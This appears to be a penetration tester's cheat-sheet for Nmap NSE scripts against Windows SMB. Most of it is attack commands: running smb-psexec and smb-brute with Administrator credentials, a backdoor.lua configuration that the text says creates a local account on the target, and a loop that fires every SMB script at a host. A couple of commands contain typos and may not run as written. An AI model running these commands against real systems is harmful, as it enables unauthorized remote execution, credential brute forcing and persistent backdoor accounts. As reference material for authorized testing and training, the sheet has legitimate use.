Default location for nse scripts:
```
/usr/share/nmap/scripts
```

Grep for something specific, e,g,:
```
/usr/share/nmap/scripts |grep smb
```

You can edit the scripts if you wish.

To execute/use a script:
```
nmap -p139,445 --script=smb-psexec.nse --script-args=smbuser=Administrator,smbpass=owned123 <targetIP> <taskToPreform>
```

Run multiple script, e.g. do brute force as well:
```
nmap -p139,445 --script=smb-brute,smb-psexec.nse --script-args=smbuser=Administrator,smbpass=owned123 <targetIP> <taskToPreform>
```

Example - this should create a local accounts on the target Windows box:
```
nmap -p139,445 --script=smb-brute,smb-psexec.nse --script-args=smbuser=Administrator,smbpass=owned123,username=test,password=test123,config=backdoor.lua <targetIP>
```

Have a look options for the script, they are located here:
```
ls /usr/share/nmap/nselib/data/psexec
```

Run all scripts pertaining to SMB for example:
```
for i in `ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | grep smb | grep -vwE "(brute|flood|print)"`; do nmap -p139,445 --script-$i <targetIP>; done
```
 
